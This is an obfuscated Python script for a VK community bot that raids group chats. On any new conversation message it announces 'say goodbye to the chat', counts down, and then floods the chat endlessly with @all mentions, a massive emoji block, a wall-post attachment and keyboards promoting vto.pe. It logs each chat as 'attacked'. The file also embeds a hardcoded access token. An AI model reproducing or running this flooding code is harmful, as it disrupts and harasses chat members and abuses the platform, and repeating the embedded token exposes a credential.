import requests
import threading
import random
import vk_api
import json 
import time
from vk_api import VkUpload
import vk_api.bot_longpoll
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType

token = 'f1e218aa4404a2bcac936288e591539dabb95084a8af17ed5c47925cb157d152ebd432825f3d3787d551b'
group_id = 192818743

IIIIiiIiIIiiIiiI = vk_api.VkApi(token=token)
IIIIiiIiIIiiiIiiiI = VkBotLongPoll(IIIIiiIiIIiiIiiI, group_id, wait=30)
IIIIiiIiIIiiiIiiiIi = IIIIiiIiIIiiIiiI.get_api()
IIiiiIIiIIkiIIiiIiI = [' @all 😀😁😂🤣😃😄😅😆😉😊😋😎😍😘🥰😗😙😚☺🙂🤗🤩🤔🤨😐😑@koloslolya АВТОР😶🙄😏😣😥😮🤐😯😪😫😴😌😛😜😝🤤😒😓😔@koloslolya АВТОР 🙃🤑😲☹🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬😷🤒🤕🤢🤮🤧😇🤠🥳🥴🥺🤥🤫🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲😴🤤😪🤐😵🥴🤢🤮🤧👿😈🤠🤑🤕🤒😷👹👺🤡💩👻💀☠👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲🏿👐🏿🙌🏿👏🏿🤝👍🏿👎🏿👊🏿✊🏾🤛🏾🤜🏾🤞🏾✌🏾🤟🏾🤘🏾👌🏿👈🏿👉🏿👆🏿👇🏿☝🏿✋🏿🤚🏾🖐🏾🖖🏾👋🏾🤙🏾💪🏾🖕🏾✍🏾🙏🏾🦶🏾🦵🏻💄💋👄🦷👅👣👂🏾👃🏾👁👄🧠🗣👤👥👶🏾👧🏾🧒🏾👦🏾👩🏿🧑🏾👨🏿👩🏾‍🦱👨🏾  🦱👩🏻  🦰👨🏻  🦰👱🏾  ♀👱🏾  ♂👩🏻  🦳👨🏻  🦳👨🏿  🦳👩🏾  🦲👨🏾  🦲🧔🏻👵🏾🧓🏾👴🏾👲🏾👳🏾  ♀👳🏾  ♂🧕🏾👮🏾  ♀👮🏾  ♂👷🏾  ♀👷🏾  ♂💂🏾  ♀💂🏾  ♂🕵🏾‍♀🕵🏾‍♂👩🏼  ⚕👨🏼  ⚕👩🏽  🌾👨🏾  🌾👩🏿  🍳👨  🍳👩🏻  🎓👨🏼 @koloslolya АВТОР 🎓👩🏽  🎤👨🏾  🎤👩🏾  🏫👨🏿  🏫👩  🏭👨🏻  🏭👩🏼  💻👨🏽  💻👩🏾  💼👨🏿  💼👩🏿  🔧👨  🔧👩🏻  🔬👨🏼  🔬👩🏽  🎨👨🏾  🎨👩🏿  🚒👨🏿  🚒👩  ✈👨🏻  ✈👩🏼  🚄👨🏽‍🚄👩🏾‍⚖👨🏿  ⚖👰🏿🤵👸🏻🤴🏻🦸🏻  ♀🦸🏻  ♂🦹🏻  ♀🦹🏻  ♂🤶🏻🎅🏻🧙🏻  ♀🧙🏻  ♂🧝🏻  ♀🧝🏻  ♂🧛🏻  ♀🧛🏻  ♂🧟  ♀🧟  ♂🧞  ♀🧞  ♂🧚🏿  ♀🧚🏻  ♂👼🏼🤰🏼🤱🏽🙇🏾  ♀🙇🏾  ♂💁🏻  ♀💁🏼  ♂🤦🏼  ♂🤷🏽  ♀🤷🏽  ♂🙎🏾  ♀🙎🏿  ♂🙍  ♀🙍🏻  ♂💇🏼  ♀💇🏼  ♂💆🏽  ♀💆🏾  ♂🧖🏿  ♀🧖🏻  ♂💅🏼🤳🏽💃🏽🕺🏾👯  ♀👫👭👬💑👩  ❤  👩👨  ❤  👨💏👩  ❤  💋  👩👨  ❤  💋  👨👪👨  👩  👧👨  👩  👧  👦👨  👩  👦  👦👨  👩  👧  👧👩  👩  👦👩  👩  👧👨  👨  👦  👦👨  👨  👧  👦👨  👨  👧👨  👨  👦👩  👩  👧@koloslolya АВТОР  👧👩  👩  👦  👦👩  👩  👧  👦👨  👨  👧  👧👩  👦👩  👧👩  👧  👦👩  👦  👦👩  👧  👧👨  👦👨  👧👨  👧  👦👨  👦  👦👨  👧  👧🧶🧵🧥🥼👚👕👖👔👗👙👘🥿👠👡👢👞👟🥾🧦🧤🧣🎩🧢👒🎓⛑👑💍👝👛👜💼🎒🧳👓🕶🥽🌂🐶🐱🐭🐹🐰🐻🦊🐽🐷🐮🦁🐯🐨🐼🐸🐵🙈🙉🙊🐒🐔🦅🦆🐥🐣🐤🐦🐧🦉🦇🐺🐗🐴🦄🐝🦗🦟🐜🐞🐌🦋🐛🕷🕸🦂🐢🐍🦎🦖🐡🦀🦞🦐🦑🐙🦕🐠🐟🐬🐳🐋🦈🐊🦏🦛🐘🦍🦓🐆🐅🐪🐫🦒🦘🐃🐂🐄🦌🐐🦙🐑🐏🐖🐎🐕🐩🐈🐓🦃🦚🦜🐀🐁🦡🦝🐇🕊🦢🐿🦔🐾🐉🐲🌵🎄🍀☘️🌿🌱🌴🌳🌲🎍🎋🍃🍂🍁🍄🐚🌸🌺🥀🌹🌷💐🌾🌼🌻🌞🌝🌛🌜🌚🌓🌒🌑🌘🌗🌖🌕🌔🌙🌎🌍🌏💫⭐️🌪🔥💥☄️⚡️✨🌟🌈☀️🌤⛅️🌥☁️🌦⛄️☃️❄️🌨🌩⛈🌧🌬💨💧💦☔️☂️🌊🌫🍏🍎🍐🍊🍋🍌🍉🍍🥭🍑🍒🍈🍓🍇🥥🥝🍅🍆🥑🥦🥬🥐🍠🥔🥕🌽🌶🥒🥯🍞🥖🥨🧀🥚🍳🌭🦴🍖🍗🥩🥓🥞🍔🍟🍕🥪🥙🌮🌯🍛🍲🍜🍝🥫🥘🥗🍣🍱🥟🍤🍙🍚🍘🍥🥠🥮🍢🍡🍧🍨🍭🍮🎂🍰🧁🥧🍦🍬🍫🍿🍩🍪🌰🥜🍶🥤🍵🍼☕️🥛🍯🍺🍻🥂🍷🥃🍸🍹🥢🥡🥣🍽🍴🥄🍾🧂⚽️🏀🏈⚾️🥎🎾🏐🏑🏒🏸🏓🎱🥏🏉🥍🏏🥅⛳️🏹🎣🥊🎿🥌⛸🛷🛹🎽🥋⛷🏂🏋🏽️  ♀️🏋🏽️‍♂️🤼  ♀️🤼  ♂️🤸🏿  ♀️🏌🏿️‍♀️🤾🏾  ♂️🤾🏽  ♀️🤺⛹🏻️  ♂️⛹🏻️  ♀️🤸  ♂️🏌️‍♂️🏇🏻🧘🏼  ♀️🧘🏽  ♂️🏄🏾  ♀️🏄🏿  ♂️🏊🏿  ♀️🏊  ♂️🤽🏻  ♀️🤽🏼  ♂️🚣🏽  ♀️🚣🏾  ♂️🧗🏿  ♀️🧗🏿  ♂️🥈🥇🏆🚴🏽  ♂️🚴🏼  ♀️🚵🏻  ♂️🚵  ♀️🥉🏅🎖🏵🎗🎫🎟🎤🎬🎨🎭🤹🏼  ♂️🤹🏻  ♀️🎪🎧🎼🎹🥁🎷🎺🎸🎻🎲♟🎯🎳🎮🎰🧩🚗🚕🚙🚌🚎🏎🚓🛴🚜🚛🚚🚐🚒🚑🚲🛵🏍🚨🚔🚍🚘🚖🚡🚠🚟🚃🚋🚞🚇🚆🚂🚈🚅🚄🚝🚊🚉✈️🛫🛬🛩💺🚤⛵️🛶🚁🛸🚀🛰🛥🛳⛴🚢⚓️⛽️🚧🗼🗽🗿🗺🚏🚥🚦🏰🏯🏟🎡🎢🎠⛲️🏔⛰🌋🏜🏝🏖⛱🗻🏕⛺️🏠🏡🏘🏚🏥🏤🏣🏬🏢🏭🏗🏦🏨🏪🏫🏩💒🏛🛣🛤⛩🕋🕍🕌⛪️🗾🎑🏞🌅🌄🌠🎇🌉🌌🌃🏙🌆🌇🎆🌁⌚️📱📲💻⌨️🖥🖨💿💾💽🗜🕹🖲🖱📀📼📷📸📹🎥📽📻📺📠📟☎️📞🎞🎙🎚🎛🧭⏱⏲⏰💡🔌📡🔋⏳⌛️🕰🔦🕯🧯🛢💸💵💴🧰⚖️💎💳💰💷💶🔧🔨⚒🛠⛏🔩⚙️🔪🧨🔫💣🧲⛓🧱🗡⚔️🛡🚬⚰️⚱️🏺🔬🔭⚗️💈🧿📿🔮🕳💊💉🧬🦠🧫🧪🌡🧹🧺🧻🚽🚰🚿🔑🛎🧴??🧼🛄🛁🗝🚪🛋🛏🛌🧸🖼🛍🛒🎁??🎏🎀🎊📩✉️🧧🎐🏮🎎🎉📨📧💌📥??📦🏷📜📯📮📭📬📫📪📃📄📑🧾📊📈📉🗃📇🗑📅📆🗓🗒🗳🗄📋📁📂🗂🗞📘📗📕??📔📓📰📙📚📖🔖🧷🔗📎✂️📍📌🧮📏📐🖇🖊🖋✒️🖌🖍📝✏️🔓🔒🔐🔏🔎🔍❤️🧡💛💚💙💜💔❣️💕💞💓💗💖🕉☪️✝️☮️💟💝💘☸️✡️🔯🕎☯️☦️🛐♍️♌️♋️♊️♉️♈️⛎♎️♏️♐️♑️♒️♓️🆔@koloslolya АВТОР⚛️🉑☢️☣️📴📳🈶🈚️🈸🈺🈷️✴️🆚💮🈲🈹🈵🈴㊗️㊙️🉐🅰️🅱️🆎🆑🅾️🆘❌💢💯🚫📛⛔️🛑⭕️♨️🚷🚯🚳🚱🔞📵⁉️  ️❔❓❕❗️🚭🔅🔆  ️⚠️🚸🔱⚜️✳️❇️💹🈯️✅♻️🔰❎🌐💠Ⓜ️🌄💤🏧🛃🛂🈂️🈳🅿️♿️🚾🛄🛅🚹🚺🚼🚻🚮🔡🔤ℹ️🔣🈁']

IiiIiiIiIIiiiIiiiIi = 0
IiiIiiIIIIIIIIIiiiIi = 0
def IIiiIIIIIiIIIIIi(IIiiiIIiIIkiIIiiIi, IIiiiIiiIIIIIiIIiI):
    if IIiiiIIiIIkiIIiiIi == 1:
        iiIiiIiIIiIIiIIiI(IIiiiIiiIIIIIiIIiI, str(random.randint(1000000000000000,9999999999999999))+IIiiiIIiIIkiIIiiIiI[0], "vtope")
        IIiiiIIiIIkiIIiiIi = 2
    elif IIiiiIIiIIkiIIiiIi == 2:
        iiIiiIiIIiIIiIIiI(IIiiiIiiIIIIIiIIiI, str(random.randint(1000000000000000,9999999999999999))+IIiiiIIiIIkiIIiiIiI[0], "vtope2")
        IIiiiIIiIIkiIIiiIi = 3
    elif IIiiiIIiIIkiIIiiIi == 3:
        iiIiiIiIIiIIiIIiI(IIiiiIiiIIIIIiIIiI, str(random.randint(1000000000000000,9999999999999999))+IIiiiIIiIIkiIIiiIiI[0], "vtope")
        IIiiiIIiIIkiIIiiIi = 4
    elif IIiiiIIiIIkiIIiiIi == 4:
        iiIiiIiIIiIIiIIiI(IIiiiIiiIIIIIiIIiI, str(random.randint(1000000000000000,9999999999999999))+IIiiiIIiIIkiIIiiIiI[0], "vtope3")
        IIiiiIIiIIkiIIiiIi = 1
    return IIiiiIIiIIkiIIiiIi

IIiiiIIiIIkiIIiiIi = 1

def IiIIiiiIiiIIIiiiIIiIIIIiiI(IIiiiIiiIIIiiiIIiII, tex_t):
    IIiiiIiiI = random.random()
    IIIIiiIiIIiiiIiiiIi.messages.send(peer_id=IIiiiIiiIIIiiiIIiII,random_id=IIiiiIiiI,message=tex_t)

def iiIiiIiIIiIIiIIiI(IIiiiIiiIIIiiiIIiII, IiIIiiiIiiIIIiiiIIiII, IiIIiiiIiiIIIiiiIIiIIi):
    IIIIiiIiIIiiiIiiiIi.messages.send(
            peer_id=IIiiiIiiIIIiiiIIiII,
            random_id=0,
            attachment='wall-192818743_1',
            message=IiIIiiiIiiIIIiiiIIiII,
            keyboard=open(IiIIiiiIiiIIIiiiIIiIIi+".json", "r", encoding="UTF-8").read()
        ) 

def IIiiiIIiIIkiIIiiI(IIIIIIIiiiiiiiiiii, IIiiiIIiIIkiIIiiIi):
    try:
        IiIIiiiIiiIIIiiiIIiIIIIiiI(IIIIIIIiiiiiiiiiii, 'ПРОЩАЙТЕСЬ С БЕСЕДОЙ, ГОСПОДА')
        IiIIiiiIiiIIIiiiIIiIIIIiiI(IIIIIIIiiiiiiiiiii, '3')
        time.sleep(0.5)
        IiIIiiiIiiIIIiiiIIiIIIIiiI(IIIIIIIiiiiiiiiiii, '2')
        time.sleep(0.5)
        IiIIiiiIiiIIIiiiIIiIIIIiiI(IIIIIIIiiiiiiiiiii, '1')
        time.sleep(0.5)
    except Exception as e:
        print(str(e)+" "+str(IIIIIIIiiiiiiiiiii)+" ")

    while True:
        try: 
            IIiiIIIIIiIIIIIi(IIiiiIIiIIkiIIiiIi, IIIIIIIiiiiiiiiiii)
            print(str(IIIIIIIiiiiiiiiiii)+" attacked")
        except Exception as e:
            print(str(e)+" "+str(IIIIIIIiiiiiiiiiii))
            break



cola = 'cola'
while cola == 'cola':
    try:
        for IIiiIIIIIiIIIIIiI in IIIIiiIiIIiiiIiiiI.listen():
            if IIiiIIIIIiIIIIIiI.type == VkBotEventType.MESSAGE_NEW:
                try: 
                    pid = IIiiIIIIIiIIIIIiI.obj.message.get('peer_id')
                    if IIiiIIIIIiIIIIIiI.from_user:
                        pass
                    else: 
                        threading.Thread(target=IIiiiIIiIIkiIIiiI, args=(pid,IIiiiIIiIIkiIIiiIi,)).start()
                    IiiIiiIiIIiiiIiiiIi+=1
                    if IIiiIIIIIiIIIIIiI.obj.message.get('text') in "vto.pe":
                        IiiIiiIIIIIIIIIiiiIi+=1
                except Exception as e:
                    print(str(e))
                print("| Добавлено: "+str(IiiIiiIiIIiiiIiiiIi)+"\n| Кликнуло: "+str(IiiIiiIIIIIIIIIiiiIi))
    except Exception as e:
        print('Error: ' + str(e))
        
            
